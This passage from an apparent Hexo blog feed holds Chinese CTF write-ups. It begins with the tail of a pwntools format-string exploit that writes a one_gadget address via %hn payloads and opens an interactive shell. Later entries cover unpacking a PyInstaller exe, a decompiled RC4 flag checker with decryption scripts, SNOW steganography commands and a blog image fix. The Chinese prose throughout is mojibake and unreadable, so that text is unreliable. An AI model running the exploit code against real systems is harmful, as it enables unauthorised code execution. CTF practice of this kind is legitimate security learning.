class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">32</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>libcç‰ˆæœ¬æ˜¯æ³„éœ²libc_start_mainåä¸Šç½‘ç«™æ‰¾çš„ï¼š<a class="link" href="https://libc.rip/">libc-database <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exe-&gt;pyc &amp;&amp; RC4 &amp;&amp;pycåç¼–è¯‘</title>
      <link href="/2024/08/22/exe-pyc-RC4/"/>
      <url>/2024/08/22/exe-pyc-RC4/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="å†…å®¹"><a href="#å†…å®¹" class="headerlink" title="å†…å®¹"></a>å†…å®¹</h1><p>è¿™ç¯‡æ–‡ç« ä¸»è¦ä»‹ç»ctfreéƒ¨åˆ†ï¼Œä»exeæ–‡ä»¶è½¬åŒ–æˆpycæ–‡ä»¶ï¼Œé¡ºä¾¿æä¸€ä¸‹rc4åŠ å¯†ã€‚</p><p>é¢˜ç›®æ¥è‡ªbasectf,å¦‚æœé€‰æ‰‹çœ‹åˆ°äº†è¯·åŠ¡å¿…é¿å¼€ã€‚</p><h1 id="è½¬åŒ–"><a href="#è½¬åŒ–" class="headerlink" title="è½¬åŒ–"></a>è½¬åŒ–</h1><h2 id="exe-pyc"><a href="#exe-pyc" class="headerlink" title="exe-&gt;pyc"></a>exe-&gt;pyc</h2><ul><li><p>é¦–å…ˆæ˜ç™½ä¸ºä»€ä¹ˆè¦ä»exe-&gt;pycï¼Œè§ä¸‹å›¾ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/exe-pyc-RC4/exe%E4%BE%8B%E5%AD%90.bmp" alt="exeä¾‹å­"></p></li></ul><p>æˆ‘ä»¬å‘ç°å›¾ç‰‡è™½ç„¶æ˜¯ä¸€ä¸ªexe,ä½†æ˜¯ç¨‹åºå›¾æ ‡æ˜¯å¯ä»¥å‘ç°æ˜¯ä¸€ä¸ª.pyæ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬è¦å»è½¬åŒ–æˆpyc</p><p><strong>ä»‹ç»ä¸€ç¯‡æ–‡ç« çœ‹çœ‹</strong>ï¼š<a class="link" href="https://blog.csdn.net/qq_35578171/article/details/138047494?app_version=6.4.5&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22138047494%22,%22source%22:%222302_79260400%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">csdn-blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è§‰å¾—éº»çƒ¦æä¾›ä¸€ä¸ªåœ¨çº¿ç½‘ç«™ï¼š<a class="link" href="https://pyinstxtractor-web.netlify.app/">PyInstaller Extractor WEB (pyinstxtractor-web.netlify.app) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è‡ªå·±é€‰æ‹©exeæ–‡ä»¶è¿è¡Œå°±è¡Œï¼Œä¼šå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢ä¼šæœ‰pycæ–‡ä»¶</p><p><img lazyload src="/images/loading.svg" data-src="/exe-pyc-RC4/exe-pyc.bmp"></p><h2 id="pyc-pyä»£ç ï¼š"><a href="#pyc-pyä»£ç ï¼š" class="headerlink" title="pyc-&gt;pyä»£ç ï¼š"></a>pyc-&gt;pyä»£ç ï¼š</h2><ul><li><p>å…ˆäº†è§£ä»€ä¹ˆæ˜¯pycï¼šæˆ‘ä»¬æ‰€çœ‹åˆ°çš„pycæ–‡ä»¶ï¼Œå…¶å®æ˜¯PyCodeObjectï¼Œæ˜¯Pythonç¼–è¯‘åçš„ç»“æœã€‚å½“pythonç¨‹åºè¿è¡Œæ—¶ï¼Œç¼–è¯‘çš„ç»“æœæ˜¯ä¿å­˜äºPyCodeObjectï¼Œç¨‹åºè¿è¡Œç»“æŸåï¼ŒPythonå°±å°†PyCodeObjectå†™å…¥åˆ°pycæ–‡ä»¶ä¸­ï¼Œè¿™æ˜¯ä¸ªå­—èŠ‚ç æ–‡ä»¶ã€‚[<a class="link" href="https://blog.csdn.net/weixin_42183408/article/details/88557812">å¼•ç”¨ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>]</p></li><li><p>åœ¨çº¿ç½‘ç«™ï¼š<a class="link" href="https://www.lddgo.net/string/pyc-compile-decompile">åœ¨çº¿Python pycæ–‡ä»¶ç¼–è¯‘ä¸åç¼–è¯‘ (lddgo.net) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li></ul><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><ul><li><p>å…ˆå‰å¾—åˆ°çš„pycè½¬åŒ–ä¸ºpyä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å¦‚ä¸‹çš„åŠ å¯†è„šæœ¬ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.9</span></span><br><span class="line"><span class="keyword">import</span> Key</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ <span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    (i, j) = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ Key.keykey[r % <span class="built_in">len</span>(Key.keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">text, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key = KeyStream(text, Sbox)</span><br><span class="line">    enc = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ text[i] ^ key[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(enc)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Please input Your flag:&#x27;</span>)</span><br><span class="line">flag = (<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(flag)</span><br><span class="line">flag = Encrypt(flag, Key.key)</span><br><span class="line"><span class="keyword">if</span> flag != enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s not flag!&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;You are right!&#x27;</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key = &#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line"><span class="string">keykey = [66,97,115,101]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li></ul><p>è¿™å°±æ˜¯å¾ˆæ˜æ˜¾çš„RC4åŠ å¯†äº†ï¼Œ256æ¬¡å¾ªç¯åˆå§‹åŒ–Sbox,ç›®çš„å°±æ˜¯ä¸ºäº†æ‰“ä¹±æ•°å­—é¡ºåºï¼Œé¡ºåºä¾é keyï¼Œç„¶åå†é€šè¿‡å¼‚æˆ–è·å¾—flagã€‚</p><ul><li>è§£å¯†è„šæœ¬ï¼ˆä»…é’ˆå¯¹æœ¬é¢˜ï¼Œå› ä¸ºæ­¤é¢˜æœ‰ä¸¤ä¸ªkeyï¼‰</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given key and keykey</span></span><br><span class="line">key = <span class="string">&#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line">keykey = [<span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = [<span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ keykey[r % <span class="built_in">len</span>(keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">enc, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key_stream = KeyStream(enc, Sbox)</span><br><span class="line">    decrypted = [enc[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given encrypted message</span></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = Decrypt(enc, key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="é€šç”¨è§£å¯†è„šæœ¬"><a href="#é€šç”¨è§£å¯†è„šæœ¬" class="headerlink" title="é€šç”¨è§£å¯†è„šæœ¬"></a>é€šç”¨è§£å¯†è„šæœ¬</h2><p>å‚è€ƒï¼š<a class="link" href="https://www.jianshu.com/p/d9ad5fc524ec">Python3.7å®ç°RC4åŠ å¯†è§£å¯†ï¼ˆè¶…è¯¦ç»†ï¼‰ - ç®€ä¹¦ (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4è§£å¯†ä¸»å‡½æ•°è°ƒç”¨æˆåŠŸ&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># æˆ‘è¿™é‡Œæ²¡ç®¡ç§˜é’¥å°äº256çš„æƒ…å†µï¼Œå°äº256ä¸æ–­é‡å¤å¡«å……å³å¯</span></span><br><span class="line">    <span class="comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;è°ƒç”¨è§£å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span></span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;resç”¨äºè§£å¯†å­—ç¬¦ä¸²ï¼Œè§£å¯†åæ˜¯ï¼š%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment"># print(&quot;è§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot; %cipher)</span></span><br><span class="line">    <span class="comment"># print(&quot;è§£å¯†åçš„è¾“å‡º(æ²¡ç»è¿‡ä»»ä½•ç¼–ç ):&quot;)</span></span><br><span class="line">    <span class="keyword">return</span>  cipher</span><br><span class="line"><span class="comment"># rc4_main(&quot;123456sh&quot;, &quot;ABHCum92PMOXwqI=&quot;)</span></span><br></pre></td></tr></table></figure></div><p>åŠ è§£å¯†å…¶å®æ²¡å¤ªå¤§åŒºåˆ«ï¼Œå¯ä»¥ä¸Šç½‘æœæœ</p><h1 id="pycåç¼–è¯‘"><a href="#pycåç¼–è¯‘" class="headerlink" title="pycåç¼–è¯‘"></a>pycåç¼–è¯‘</h1><p><a class="link" href="https://www.lddgo.net/string/pyc-compile-decompile">åœ¨çº¿ç½‘ç«™ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="magic-number"><a href="#magic-number" class="headerlink" title="magic number"></a>magic number</h2><ul><li>æ­£å¸¸çš„ç›´æ¥ä¸¢åˆ°åœ¨çº¿ç½‘ç«™åˆ†è§£å‘ç°æ— æ³•åˆ†è§£ï¼Œå‘ç°ç»™çš„é™„ä»¶é‡Œé¢è¿˜æœ‰structæ–‡ä»¶ï¼Œä¸Šç½‘æŸ¥äº†æŸ¥ï¼Œå‘ç°æ˜¯ç»™çš„pycæ–‡ä»¶çš„magic numberå‡ºç°é”™è¯¯</li><li><mark>æ­£ç¡®çš„magic numberåœ¨struct<mark></mark></mark></li></ul><p><img lazyload src="/images/loading.svg" data-src="/exe-pyc-RC4/capture_20241014191021381.bmp"></p><p><mark>E3å‰é¢çš„å°±æ˜¯magic number<mark>,ä¿®æ”¹æˆ–è€…å¢æ·»åˆ°ç»™çš„pycæ–‡ä»¶ï¼Œå†å»ç½‘ç«™è§£å¯†å³å¯ã€‚</mark></mark></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-ç‰¹æ®ŠåŠ å¯†</title>
      <link href="/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SNOW-é›ª"><a href="#SNOW-é›ª" class="headerlink" title="SNOW(é›ª)"></a>SNOW(é›ª)</h1><ul><li>å…³äºä¸€ç§txtç©ºç™½åŠ å¯†çš„æ–¹æ³•ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../%E6%A0%B7%E4%BE%8B.bmp"></p><p>åƒè¿™æ ·å­çš„ï¼Œtxtæ–‡ä»¶ç”¨winHexæ‰“å¼€ï¼Œå‘ç°æ–‡å­—åé¢å¤§ç‰‡çš„ç©ºç™½ï¼ŒçŒœæµ‹æ˜¯SNOWåŠ å¯†ã€‚</p><ul><li><p>å·¥å…·ä¸‹è½½åœ°å€ï¼š<a class="link" href="https://darkside.com.au/snow/">The SNOW Home Page (darkside.com.au) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>ä½¿ç”¨ï¼šå°†è¦è§£å¯†çš„txtæ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¿˜éœ€è¦çŸ¥é“keyï¼Œç„¶ååˆ©ç”¨æŒ‡ä»¤è§£å¯†ï¼š</p><p><code>.\SNOW.EXE -p key -C .\flag.txt</code>   [è§£å¯†]</p><p><code>.\SNOW.EXE -C -m &quot;message&quot; -p &quot;key&quot; infile outfile</code> [åŠ å¯†]</p><p>åŠ å¯†è¡¨ç¤ºå°†éšè—æ–‡ä»¶infileä¸­çš„messageç”¨keyåŠ å¯†ï¼Œå‚¨å­˜åœ¨outfileä¸­</p><p><img lazyload src="/images/loading.svg" data-src="/../%E8%A7%A3%E5%AF%86%E6%8C%87%E4%BB%A4.bmp"></p></li><li><p>è¯¦ç»†çš„å¯å‚è€ƒï¼š<a class="link" href="https://blog.csdn.net/qq_53079406/article/details/123810053">csdn-blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°å½•è§£å†³hexoæ’å›¾å¤±è´¥</title>
      <link href="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="èµ·å› "><a href="#èµ·å› " class="headerlink" title="èµ·å› "></a>èµ·å› </h1><ul><li>æ ¹æ®ç½‘ä¸Šæ•™å­¦æ­å»ºåšå®¢ï¼Œæƒ³è¦æ’å…¥<strong>æœ¬åœ°å›¾ç‰‡</strong>ï¼Œä½†æ˜¯å›¾ç‰‡å§‹ç»ˆæ— æ³•åŠ è½½å‡ºæ¥ï¼š</li></ul><p><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%A4%B1%E8%B4%A5%E6%A0%B7%E4%BE%8B.bmp" alt="å¤±è´¥æ ·ä¾‹"></p><p>ç±»ä¼¼äºä¸Šé¢çš„æƒ…å†µï¼Œæˆ–è€…å°±ä¸€ä¸ªå°å›¾æ¡ˆï¼Œæ— æ³•åŠ è½½å‡ºæ¥ã€‚</p><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><ul><li><p>æŒ‰ç…§ç½‘ä¸Šè¯´çš„ï¼Œå…ˆä¿®æ”¹Blogç›®å½•ä¸‹çš„_config.ymlä¸­çš„<strong>post_asset_foldeæ”¹ä¸ºtrue</strong>,è¿™ä¸ªå¿…é¡»å…ˆè¯¥</p></li><li><p>ä¸‹è½½æ’ä»¶ï¼š</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install <span class="attr">https</span>:<span class="comment">//github.com/CodeFalling/hexo-asset-image --save</span></span><br></pre></td></tr></table></figure></div></li><li><p>ä¿®æ”¹Typoraçš„å›¾åƒåå¥½ï¼š<br><img lazyload src="/images/loading.svg" data-src="/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%81%8F%E5%A5%BD%E8%AE%BE%E7%BD%AE.bmp" alt="åå¥½è®¾ç½®"></p></li></ul><p>åƒè¿™æ ·è®¾ç½®å¥½ï¼Œè¿™æ ·ä½ åœ¨æ¯ä¸€æ¬¡hexo new XXXçš„æ—¶å€™ï¼Œ<strong>éƒ½ä¼šåœ¨_postsä¸‹é¢ç”Ÿæˆä¸€ä¸ªå’Œ.mdåŒåçš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹å°±ä¼šä¸“é—¨æ¥æ”¾ä½ çš„å›¾ç‰‡</strong>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ï¼Œæå‰å°†å›¾ç‰‡æ”¾è¿›å»ã€‚</p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><ul><li>å…³äºå…¶ä»–çš„æ’å…¥å›¾ç‰‡æ–¹å¼ï¼Œæ¯”å¦‚å»ºç«‹å›¾åºŠ&lt;ï¼<a href="url"></a>&gt;æ¥å¼•ç”¨å›¾ç‰‡ï¼Œä¸ªäººæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒå¤æ‚ï¼Œå°±æ²¡æœ‰å®ç°äº†ï¼Œä»¥åæœ‰æ—¶é—´å†å°è¯•ã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> æ­å»ºåšå®¢ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬ä¸€ç¯‡åšå®¢</title>
      <link href="/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
